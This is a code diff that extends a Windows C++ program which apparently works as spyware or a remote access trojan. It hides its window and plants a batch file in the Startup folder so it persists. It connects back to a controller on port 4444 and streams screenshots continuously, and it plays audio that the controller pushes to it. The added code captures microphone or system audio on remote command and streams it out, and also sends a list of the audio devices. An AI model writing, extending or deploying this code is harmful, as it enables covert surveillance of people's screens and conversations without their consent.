@@ -4,12 +4,15 @@
 #include <gdiplus.h>
 #include <mmsystem.h>
 #include <mmdeviceapi.h>
+#include <audioclient.h>
 #include <endpointvolume.h>
+#include <propsys.h>
 #include <string>
 #include <thread>
 #include <fstream>
 #include <vector>
 #include <cstdio>
+#include <atomic>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "gdiplus.lib")
@@ -17,199 +20,254 @@
 #pragma comment(lib, "ole32.lib")
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
-// Use 127.0.0.1 for same-machine testing, or the LAN IP for remote
 const char* SERVER_IP = "127.0.0.1";
-const int PORT = 4444;
+const int PORT        = 4444;
+const int PORT_AUDIO  = 4445;
+const int PORT_DEVS   = 4446;
+
+static const GUID s_SUBTYPE_FLOAT =
+    {0x00000003,0x0000,0x0010,{0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}};
+static const PROPERTYKEY s_PKEY_FriendlyName =
+    {{0xa45c254e,0xdf1c,0x4efd,{0x80,0x20,0x67,0xd1,0x46,0xa8,0x50,0xe0}},14};
+
+static std::atomic<bool> g_CaptureRunning{false};
+static std::atomic<bool> g_StopCapture{false};
 
 // ── volume ──
-
-void SetVolume(int vol) {
+void SetVolume(int vol){
     CoInitialize(0);
-    IMMDeviceEnumerator* pEnum = 0;
-    IMMDevice* pDev = 0;
-    IAudioEndpointVolume* pVol = 0;
-    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator), 0, CLSCTX_ALL,
-                   __uuidof(IMMDeviceEnumerator), (void**)&pEnum)) &&
-        SUCCEEDED(pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDev)) &&
-        SUCCEEDED(pDev->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, 0, (void**)&pVol))) {
-        pVol->SetMasterVolumeLevelScalar(vol / 100.0f, 0);
-        pVol->Release();
-    }
-    if (pDev)  pDev->Release();
-    if (pEnum) pEnum->Release();
+    IMMDeviceEnumerator* pE=0; IMMDevice* pD=0; IAudioEndpointVolume* pV=0;
+    if(SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,
+        __uuidof(IMMDeviceEnumerator),(void**)&pE)) &&
+       SUCCEEDED(pE->GetDefaultAudioEndpoint(eRender,eConsole,&pD)) &&
+       SUCCEEDED(pD->Activate(__uuidof(IAudioEndpointVolume),CLSCTX_ALL,0,(void**)&pV)))
+        pV->SetMasterVolumeLevelScalar(vol/100.0f,0);
+    if(pV) pV->Release(); if(pD) pD->Release(); if(pE) pE->Release();
     CoUninitialize();
 }
 
-// ── gdi+ helper ──
-
-int GetEncoderClsid(const WCHAR* mime, CLSID* clsid) {
-    UINT num = 0, size = 0;
-    Gdiplus::GetImageEncodersSize(&num, &size);
-    if (!size) return -1;
-    Gdiplus::ImageCodecInfo* p = (Gdiplus::ImageCodecInfo*)malloc(size);
-    Gdiplus::GetImageEncoders(num, size, p);
-    for (UINT i = 0; i < num; i++) {
-        if (wcscmp(p[i].MimeType, mime) == 0) {
-            *clsid = p[i].Clsid;
-            free(p);
-            return i;
-        }
-    }
-    free(p);
-    return -1;
+// ── gdi+ ──
+int GetEncoderClsid(const WCHAR* mime,CLSID* clsid){
+    UINT num=0,size=0; Gdiplus::GetImageEncodersSize(&num,&size);
+    if(!size) return -1;
+    Gdiplus::ImageCodecInfo* p=(Gdiplus::ImageCodecInfo*)malloc(size);
+    Gdiplus::GetImageEncoders(num,size,p);
+    for(UINT i=0;i<num;i++) if(wcscmp(p[i].MimeType,mime)==0){*clsid=p[i].Clsid;free(p);return i;}
+    free(p); return -1;
 }
 
 // ── network ──
-
-bool SendAll(SOCKET s, const char* d, int len) {
-    int t = 0;
-    while (t < len) {
-        int n = send(s, d + t, len - t, 0);
-        if (n <= 0) return false;
-        t += n;
-    }
-    return true;
+bool SendAll(SOCKET s,const char* d,int len){
+    int t=0; while(t<len){int n=send(s,d+t,len-t,0);if(n<=0)return false;t+=n;} return true;
+}
+bool RecvAll(SOCKET s,char* d,int len){
+    int t=0; while(t<len){int n=recv(s,d+t,len-t,0);if(n<=0)return false;t+=n;} return true;
 }
 
-bool RecvAll(SOCKET s, char* d, int len) {
-    int t = 0;
-    while (t < len) {
-        int n = recv(s, d + t, len - t, 0);
-        if (n <= 0) return false;
-        t += n;
+// ── audio capture & stream ──
+bool IsFloatFmt(WAVEFORMATEX* pw){
+    if(pw->wFormatTag==WAVE_FORMAT_IEEE_FLOAT) return true;
+    if(pw->wFormatTag==WAVE_FORMAT_EXTENSIBLE)
+        return ((WAVEFORMATEXTENSIBLE*)pw)->SubFormat==s_SUBTYPE_FLOAT;
+    return false;
+}
+
+void CaptureAndStream(bool systemAudio, int micDevIdx){
+    g_CaptureRunning=true;
+
+    SOCKET sock=socket(AF_INET,SOCK_STREAM,0);
+    sockaddr_in addr{}; addr.sin_family=AF_INET; addr.sin_port=htons(PORT_AUDIO);
+    inet_pton(AF_INET,SERVER_IP,&addr.sin_addr);
+    if(connect(sock,(sockaddr*)&addr,sizeof(addr))!=0){closesocket(sock);g_CaptureRunning=false;return;}
+
+    CoInitialize(0);
+    IMMDeviceEnumerator* pE=NULL; IMMDevice* pD=NULL;
+    IAudioClient* pAC=NULL; IAudioCaptureClient* pCC=NULL; WAVEFORMATEX* pwfx=NULL;
+
+    HRESULT hr=CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,
+                 __uuidof(IMMDeviceEnumerator),(void**)&pE);
+    if(SUCCEEDED(hr)){
+        if(systemAudio){
+            hr=pE->GetDefaultAudioEndpoint(eRender,eConsole,&pD);
+        } else {
+            IMMDeviceCollection* pC=NULL;
+            hr=pE->EnumAudioEndpoints(eCapture,DEVICE_STATE_ACTIVE,&pC);
+            if(SUCCEEDED(hr)){
+                UINT cnt; pC->GetCount(&cnt);
+                hr=(micDevIdx<(int)cnt)?pC->Item(micDevIdx,&pD):E_FAIL;
+                pC->Release();
+            }
+        }
     }
-    return true;
+    if(SUCCEEDED(hr)) hr=pD->Activate(__uuidof(IAudioClient),CLSCTX_ALL,0,(void**)&pAC);
+    if(SUCCEEDED(hr)) hr=pAC->GetMixFormat(&pwfx);
+
+    DWORD flags=systemAudio?AUDCLNT_STREAMFLAGS_LOOPBACK:0;
+    if(SUCCEEDED(hr)) hr=pAC->Initialize(AUDCLNT_SHAREMODE_SHARED,flags,10000000,0,pwfx,NULL);
+    if(SUCCEEDED(hr)) hr=pAC->GetService(__uuidof(IAudioCaptureClient),(void**)&pCC);
+
+    if(SUCCEEDED(hr)){
+        int sr=pwfx->nSamplesPerSec; short ch=pwfx->nChannels;
+        bool isF=IsFloatFmt(pwfx);
+        send(sock,(char*)&sr,4,0); send(sock,(char*)&ch,2,0);
+        pAC->Start();
+
+        while(!g_StopCapture){
+            UINT32 pkt; hr=pCC->GetNextPacketSize(&pkt);
+            if(FAILED(hr)) break;
+            if(pkt==0){Sleep(5);continue;}
+            BYTE* pData; UINT32 nF; DWORD bf;
+            hr=pCC->GetBuffer(&pData,&nF,&bf,NULL,NULL);
+            if(FAILED(hr)) break;
+            int total=nF*ch, pcmLen=total*2;
+            std::vector<short> pcm(total);
+            if(bf&AUDCLNT_BUFFERFLAGS_SILENT){
+                memset(pcm.data(),0,pcmLen);
+            } else if(isF){
+                float* f=(float*)pData;
+                for(int i=0;i<total;i++){
+                    float v=f[i]; if(v>1.f)v=1.f; if(v<-1.f)v=-1.f;
+                    pcm[i]=(short)(v*32767.f);
+                }
+            } else if(pwfx->wBitsPerSample==16){
+                memcpy(pcm.data(),pData,pcmLen);
+            } else { memset(pcm.data(),0,pcmLen); }
+            pCC->ReleaseBuffer(nF);
+            if(!SendAll(sock,(char*)&pcmLen,4)||!SendAll(sock,(char*)pcm.data(),pcmLen)) break;
+        }
+        pAC->Stop();
+    }
+
+    if(pwfx) CoTaskMemFree(pwfx);
+    if(pCC) pCC->Release(); if(pAC) pAC->Release();
+    if(pD) pD->Release(); if(pE) pE->Release();
+    CoUninitialize();
+    closesocket(sock);
+    g_CaptureRunning=false;
+}
+
+// ── device list ──
+void SendDeviceList(){
+    SOCKET sock=socket(AF_INET,SOCK_STREAM,0);
+    sockaddr_in addr{}; addr.sin_family=AF_INET; addr.sin_port=htons(PORT_DEVS);
+    inet_pton(AF_INET,SERVER_IP,&addr.sin_addr);
+    if(connect(sock,(sockaddr*)&addr,sizeof(addr))!=0){closesocket(sock);return;}
+
+    CoInitialize(0);
+    IMMDeviceEnumerator* pE=NULL;
+    CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,
+                     __uuidof(IMMDeviceEnumerator),(void**)&pE);
+    IMMDeviceCollection* pC=NULL;
+    pE->EnumAudioEndpoints(eCapture,DEVICE_STATE_ACTIVE,&pC);
+    UINT cnt=0; pC->GetCount(&cnt);
+    int n=(int)cnt; SendAll(sock,(char*)&n,4);
+    for(int i=0;i<n;i++){
+        IMMDevice* pD=NULL; pC->Item(i,&pD);
+        IPropertyStore* pS=NULL; pD->OpenPropertyStore(STGM_READ,&pS);
+        PROPVARIANT nm; ZeroMemory(&nm,sizeof(nm));
+        pS->GetValue(s_PKEY_FriendlyName,&nm);
+        char buf[256]={};
+        if(nm.vt==VT_LPWSTR&&nm.pwszVal) wcstombs(buf,nm.pwszVal,255);
+        int len=(int)strlen(buf);
+        SendAll(sock,(char*)&len,4); SendAll(sock,buf,len);
+        if(nm.vt==VT_LPWSTR&&nm.pwszVal) CoTaskMemFree(nm.pwszVal);
+        pS->Release(); pD->Release();
+    }
+    pC->Release(); pE->Release(); CoUninitialize();
+    closesocket(sock);
 }
 
 // ── command listener ──
-
-void CommandListener(SOCKET s) {
-    while (true) {
-        char cmd;
-        if (recv(s, &cmd, 1, 0) != 1) break;
-
-        if (cmd == 'V') {
-            int vol;
-            if (!RecvAll(s, (char*)&vol, 4)) break;
-            SetVolume(vol);
+void CommandListener(SOCKET s){
+    while(true){
+        char cmd; if(recv(s,&cmd,1,0)!=1) break;
+        if(cmd=='V'){
+            int vol; if(!RecvAll(s,(char*)&vol,4)) break; SetVolume(vol);
         }
-        else if (cmd == 'P') {
-            int sz;
-            if (!RecvAll(s, (char*)&sz, 4)) break;
-            std::vector<char> buf(sz);
-            if (!RecvAll(s, buf.data(), sz)) break;
-
-            // FIX: close MCI first so it releases the file lock
-            mciSendStringA("close nyx", 0, 0, 0);
-
-            char tmp[MAX_PATH];
-            GetTempPathA(MAX_PATH, tmp);
-            std::string f = std::string(tmp) + "nyx_remote.mp3";
-            std::ofstream out(f, std::ios::binary);
-            out.write(buf.data(), sz);
-            out.close();
-
-            mciSendStringA(("open \"" + f + "\" type mpegvideo alias nyx").c_str(), 0, 0, 0);
-            mciSendStringA("play nyx", 0, 0, 0);
+        else if(cmd=='P'){
+            int sz; if(!RecvAll(s,(char*)&sz,4)) break;
+            std::vector<char> buf(sz); if(!RecvAll(s,buf.data(),sz)) break;
+            char tmp[MAX_PATH]; GetTempPathA(MAX_PATH,tmp);
+            std::string f=std::string(tmp)+"nyx_remote.mp3";
+            mciSendStringA("close nyx",0,0,0);
+            std::ofstream out(f,std::ios::binary); out.write(buf.data(),sz); out.close();
+            mciSendStringA(("open \""+f+"\" type mpegvideo alias nyx").c_str(),0,0,0);
+            mciSendStringA("play nyx",0,0,0);
+        }
+        else if(cmd=='A'){
+            char on; if(recv(s,&on,1,0)!=1) break;
+            if(on){
+                g_StopCapture=true; while(g_CaptureRunning) Sleep(10);
+                g_StopCapture=false;
+                std::thread(CaptureAndStream,true,0).detach();
+            } else { g_StopCapture=true; }
+        }
+        else if(cmd=='M'){
+            char on; if(recv(s,&on,1,0)!=1) break;
+            int di=0;
+            if(on && !RecvAll(s,(char*)&di,4)) break;
+            if(on){
+                g_StopCapture=true; while(g_CaptureRunning) Sleep(10);
+                g_StopCapture=false;
+                std::thread(CaptureAndStream,false,di).detach();
+            } else { g_StopCapture=true; }
+        }
+        else if(cmd=='L'){
+            std::thread([](){SendDeviceList();}).detach();
         }
     }
 }
 
-// ── entry ──
-
-int main() {
+// ── main ──
+int main(){
     SetProcessDPIAware();
 
-    // auto-start batch
-    {
-        char me[MAX_PATH];
-        GetModuleFileNameA(0, me, MAX_PATH);
-        std::string path = std::string(getenv("USERPROFILE")) +
+    { // auto-start
+        char me[MAX_PATH]; GetModuleFileNameA(0,me,MAX_PATH);
+        std::string path=std::string(getenv("USERPROFILE"))+
             "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
-        std::ofstream bat(path);
-        bat << "@echo off\nstart \"\" \"" << me << "\"\n";
-        bat.close();
+        std::ofstream bat(path); bat<<"@echo off\nstart \"\" \""<<me<<"\"\n"; bat.close();
     }
 
-    WSADATA wsa;
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
+    WSADATA wsa; if(WSAStartup(MAKEWORD(2,2),&wsa)!=0) return 1;
 
-    Gdiplus::GdiplusStartupInput gdip;
-    ULONG_PTR gdipTok;
-    Gdiplus::GdiplusStartup(&gdipTok, &gdip, 0);
+    Gdiplus::GdiplusStartupInput gdip; ULONG_PTR gdipTok;
+    Gdiplus::GdiplusStartup(&gdipTok,&gdip,0);
+    CLSID jpegClsid; GetEncoderClsid(L"image/jpeg",&jpegClsid);
 
-    CLSID jpegClsid;
-    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) < 0) {
-        Gdiplus::GdiplusShutdown(gdipTok);
-        WSACleanup();
-        return 1;
-    }
+    Gdiplus::EncoderParameters eps; eps.Count=1;
+    eps.Parameter[0].Guid=Gdiplus::EncoderQuality;
+    eps.Parameter[0].Type=Gdiplus::EncoderParameterValueTypeLong;
+    eps.Parameter[0].NumberOfValues=1;
+    ULONG quality=78; eps.Parameter[0].Value=&quality;
 
-    Gdiplus::EncoderParameters eps;
-    eps.Count = 1;
-    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;  // <-- fixed
-    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
-    eps.Parameter[0].NumberOfValues = 1;
-    ULONG quality = 78;
-    eps.Parameter[0].Value = &quality;
-
-    while (true) {
-        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock == INVALID_SOCKET) { Sleep(5000); continue; }
-
-        sockaddr_in addr{};
-        addr.sin_family = AF_INET;
-        addr.sin_port   = htons(PORT);
-        inet_pton(AF_INET, SERVER_IP, &addr.sin_addr);
-
-        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
-            std::thread(CommandListener, sock).detach();
-
-            while (true) {
-                HDC hdcScr = GetDC(NULL);
-                int w = GetSystemMetrics(SM_CXSCREEN);
-                int h = GetSystemMetrics(SM_CYSCREEN);
-
-                HDC mem = CreateCompatibleDC(hdcScr);
-                HBITMAP bmp = CreateCompatibleBitmap(hdcScr, w, h);
-                HBITMAP oldBmp = (HBITMAP)SelectObject(mem, bmp);
-                BitBlt(mem, 0, 0, w, h, hdcScr, 0, 0, SRCCOPY);
-
-                IStream* strm = 0;
-                CreateStreamOnHGlobal(0, TRUE, &strm);
-                {
-                    Gdiplus::Bitmap gdibmp(bmp, NULL);
-                    gdibmp.Save(strm, &jpegClsid, &eps);
-                }
-
-                SelectObject(mem, oldBmp);
-                DeleteObject(bmp);
-                DeleteDC(mem);
-                ReleaseDC(NULL, hdcScr);
-
-                STATSTG st;
-                strm->Stat(&st, STATFLAG_NONAME);
-                ULONG len = st.cbSize.LowPart;
-                BYTE* data = new BYTE[len];
-                LARGE_INTEGER li{};
-                strm->Seek(li, STREAM_SEEK_SET, 0);
-                ULONG rd;
-                strm->Read(data, len, &rd);
-                strm->Release();
-
-                bool ok = SendAll(sock, (char*)&len, 4) && SendAll(sock, (char*)data, len);
-                delete[] data;
-
-                if (!ok) break;
+    while(true){
+        SOCKET sock=socket(AF_INET,SOCK_STREAM,0);
+        if(sock==INVALID_SOCKET){Sleep(5000);continue;}
+        sockaddr_in addr{}; addr.sin_family=AF_INET; addr.sin_port=htons(PORT);
+        inet_pton(AF_INET,SERVER_IP,&addr.sin_addr);
+        if(connect(sock,(sockaddr*)&addr,sizeof(addr))==0){
+            std::thread(CommandListener,sock).detach();
+            while(true){
+                HDC hdcScr=GetDC(NULL);
+                int w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);
+                HDC mem=CreateCompatibleDC(hdcScr);
+                HBITMAP bmp=CreateCompatibleBitmap(hdcScr,w,h);
+                HBITMAP oldB=(HBITMAP)SelectObject(mem,bmp);
+                BitBlt(mem,0,0,w,h,hdcScr,0,0,SRCCOPY);
+                IStream* strm=0; CreateStreamOnHGlobal(0,TRUE,&strm);
+                { Gdiplus::Bitmap gb(bmp,NULL); gb.Save(strm,&jpegClsid,&eps); }
+                SelectObject(mem,oldB); DeleteObject(bmp); DeleteDC(mem); ReleaseDC(NULL,hdcScr);
+                STATSTG st; strm->Stat(&st,STATFLAG_NONAME);
+                ULONG len=st.cbSize.LowPart; BYTE* data=new BYTE[len];
+                LARGE_INTEGER li{}; strm->Seek(li,STREAM_SEEK_SET,0);
+                ULONG rd; strm->Read(data,len,&rd); strm->Release();
+                bool ok=SendAll(sock,(char*)&len,4)&&SendAll(sock,(char*)data,len);
+                delete[] data; if(!ok) break;
                 Sleep(150);
             }
         }
-
-        closesocket(sock);
-        Sleep(5000);
+        closesocket(sock); Sleep(5000);
     }
-
-    Gdiplus::GdiplusShutdown(gdipTok);
-    WSACleanup();
-    return 0;
+    Gdiplus::GdiplusShutdown(gdipTok); WSACleanup(); return 0;
 }
